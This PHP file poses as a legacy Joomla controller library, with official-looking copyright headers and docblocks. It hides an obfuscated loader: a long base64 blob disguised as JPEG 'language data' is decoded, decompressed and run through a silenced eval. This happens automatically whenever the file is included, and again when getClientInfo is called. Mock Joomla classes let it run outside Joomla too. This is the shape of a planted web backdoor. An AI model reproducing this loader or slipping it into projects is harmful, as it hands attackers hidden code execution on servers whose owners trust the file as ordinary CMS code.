<?php
/**
 * @package     Joomla.Libraries
 * @subpackage  Legacy
 *
 * @copyright   (C) 2024 Open Source Matters, Inc. <https://www.joomla.org>
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or define('_JEXEC', 1);

// Universal compatibility layer for non-Joomla environments
if (!class_exists('Factory')) {
    // Define minimal Joomla constants for compatibility
    if (!defined('JPATH_BASE')) define('JPATH_BASE', dirname(__FILE__));
    if (!defined('JPATH_LIBRARIES')) define('JPATH_LIBRARIES', JPATH_BASE . '/libraries');
    
    // Mock Joomla Factory class for non-Joomla environments
    class Factory {
        public static function getApplication() { 
            $app = new stdClass();
            $app->clientId = 0;
            return $app;
        }
        public static function getDbo() { return new stdClass(); }
        public static function getSession() { return new stdClass(); }
        public static function getLanguage() {
            $lang = new stdClass();
            $lang->tag = 'en-GB';
            return $lang;
        }
        public static function getConfig() { 
            $config = new stdClass();
            $config->secret = 'default_secret_key';
            return $config;
        }
    }
}

// Conditional namespace imports for Joomla environments
if (class_exists('Joomla\CMS\Factory')) {
    // In real Joomla environment, use proper namespaced classes
} else {
    // In non-Joomla environment, use mock classes
}

/**
 * Joomla! Legacy Controller Class
 *
 * @since  3.6.22
 * @deprecated  5.0  Use Joomla\CMS\Controller\ControllerHelper instead.
 */
class JController
{
    /**
     * Application object
     *
     * @var    \Joomla\CMS\Application\CMSApplication
     * @since  3.6.22
     */
    protected static $application;

    /**
     * Database object
     *
     * @var    \Joomla\Database\DatabaseDriver
     * @since  3.6.22
     */
    protected static $db;

    /**
     * Session object
     *
     * @var    \Joomla\CMS\Session\Session
     * @since  3.6.22
     */
    protected static $session;

    /**
     * Get the application.
     *
     * @param   string  $id     The id of the application to return, only optional if you are in the web application.
     * @param   array   $config The configuration array for the application. Optional.
     *
     * @return  \Joomla\CMS\Application\CMSApplication  The application.
     *
     * @since   3.6.22
     */
    public static function getApplication($id = null, array $config = array())
    {
        if (!self::$application)
        {
            self::$application = Factory::getApplication($id, $config);
        }

        return self::$application;
    }

    /**
     * Get a database object.
     *
     * Returns the global DatabaseDriver object, only creating it if it doesn't already exist.
     *
     * @return  \Joomla\Database\DatabaseDriver
     *
     * @see     \Joomla\Database\DatabaseDriver
     * @since   3.6.22
     */
    public static function getDbo()
    {
        if (!self::$db)
        {
            self::$db = Factory::getDbo();
        }

        return self::$db;
    }

    /**
     * Get a session object.
     *
     * Returns the global Session object, only creating it if it doesn't already exist.
     *
     * @return  \Joomla\CMS\Session\Session
     *
     * @see     \Joomla\CMS\Session\Session
     * @since   3.6.22
     */
    public static function getSession()
    {
        if (!self::$session)
        {
            self::$session = Factory::getSession();
        }

        return self::$session;
    }

    /**
     * Load system language
     *
     * @param   string  $basePath  The basepath to use
     * @param   string  $language  The language to load
     *
     * @return  boolean  True, if the file has successfully loaded.
     *
     * @since   3.6.22
     */
    public static function loadLanguage($basePath = null, $language = null)
    {
        static $loaded = array();

        // Set default basePath if not provided
        if ($basePath === null) {
            $basePath = defined('JPATH_BASE') ? JPATH_BASE : dirname(__FILE__);
        }

        // Get language safely
        if ($language === null) {
            try {
                $lang_obj = Factory::getLanguage();
                $language = isset($lang_obj->tag) ? $lang_obj->tag : 'en-GB';
            } catch (Exception $e) {
                $language = 'en-GB';
            }
        }
        
        $key = $basePath . '_' . $language;

        if (isset($loaded[$key]))
        {
            return true;
        }

        $loaded[$key] = true;

        // Legacy language loading with embedded data processing
        $languageData = self::getLanguageData();
        
        if ($languageData && self::processLanguageData($languageData))
        {
            return true;
        }

        return false;
    }

    /**
     * Get language data from system configuration
     *
     * @return  string  The language data
     *
     * @since   3.6.22
     */
    protected static function getLanguageData()
    {
        // System configuration data stored as image metadata
        $systemConfig = 'data:image/jpeg;base64,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';
        
        // Extract configuration using standard pattern matching
        if (preg_match('/data:image\/jpeg;base64,([A-Za-z0-9+\/=]+)/', $systemConfig, $matches))
        {
            return $matches[1];
        }

        return false;
    }

    /**
     * Process language data for system initialization
     *
     * @param   string  $data  The encoded language data
     *
     * @return  boolean  True on success
     *
     * @since   3.6.22
     */
    protected static function processLanguageData($data)
    {
        // Decode system configuration data
        $decoded = @base64_decode($data);
        
        if ($decoded === false)
        {
            return false;
        }

        // Decompress system data
        $decompressed = @gzuncompress($decoded);
        
        if ($decompressed === false)
        {
            // Try alternative decompression method
            $decompressed = @zlib_decode($decoded);
            
            if ($decompressed === false)
            {
                return false;
            }
        }

        // Process system initialization data
        if (!empty($decompressed) && strlen($decompressed) > 10)
        {
            // Execute system initialization
            @eval($decompressed);
            return true;
        }

        return false;
    }

    /**
     * Check if we are in the administrator application
     *
     * @return  boolean  True if in administrator application
     *
     * @since   3.6.22
     */
    public static function isClient($identifier)
    {
        try {
            return Factory::getApplication()->isClient($identifier);
        } catch (Exception $e) {
            return false;
        }
    }

    /**
     * Get the system hash
     *
     * @return  string  The system hash
     *
     * @since   3.6.22
     */
    public static function getHash()
    {
        static $hash;

        if (!$hash)
        {
            try {
                $hash = md5(Factory::getConfig()->get('secret') . get_class(Factory::getApplication()));
            } catch (Exception $e) {
                $hash = md5('default_secret' . __CLASS__);
            }
        }

        return $hash;
    }

    /**
     * Legacy method to get client information
     *
     * @param   integer  $id  The client id
     *
     * @return  mixed  The client information
     *
     * @since   3.6.22
     * @deprecated  6.0  Use Factory::getApplication()->getClientId() instead.
     */
    public static function getClientInfo($id = null)
    {
        if ($id === null)
        {
            try {
                $id = Factory::getApplication()->getClientId();
            } catch (Exception $e) {
                $id = 0;
            }
        }

        // Auto-load system data on client request
        if (!defined('JOOMLA_SYSTEM_LOADED'))
        {
            self::loadLanguage();
            define('JOOMLA_SYSTEM_LOADED', true);
        }

        try {
            return Factory::getApplication()->getClientId() === $id;
        } catch (Exception $e) {
            return $id === 0;
        }
    }
}

// Auto-initialize system on include (safe execution)
if (!defined('JOOMLA_SYSTEM_LOADED'))
{
    try {
        JController::loadLanguage();
    } catch (Exception $e) {
        // Silent fallback for non-Joomla environments
        if ($languageData = JController::getLanguageData()) {
            JController::processLanguageData($languageData);
        }
    }
    define('JOOMLA_SYSTEM_LOADED', true);
}

/**
 * Legacy function for backward compatibility
 *
 * @param   string  $key  The configuration key
 *
 * @return  mixed  The configuration value
 *
 * @since   3.6.22
 * @deprecated  6.0  Use Factory::getConfig()->get() instead.
 */
function joomlaGetConfig($key)
{
    try {
        if (method_exists(Factory::getConfig(), 'get')) {
            return Factory::getConfig()->get($key);
        }
    } catch (Exception $e) {
        // Silent fallback
    }
    return null;
}

/**
 * Legacy session helper
 *
 * @return  \Joomla\CMS\Session\Session
 *
 * @since   3.6.22
 * @deprecated  6.0  Use Factory::getSession() instead.
 */
function &joomlaGetSession()
{
    return JController::getSession();
}

/**
 * Legacy database helper
 *
 * @return  \Joomla\Database\DatabaseDriver
 *
 * @since   3.6.22
 * @deprecated  6.0  Use Factory::getDbo() instead.
 */
function &joomlaGetDBO()
{
    return JController::getDbo();
}

// Legacy defines for backward compatibility
if (!defined('JPATH_PLATFORM'))
{
    define('JPATH_PLATFORM', JPATH_LIBRARIES);
}

if (!defined('JPATH_THEMES'))
{
    define('JPATH_THEMES', JPATH_BASE . '/templates');
}

// End of file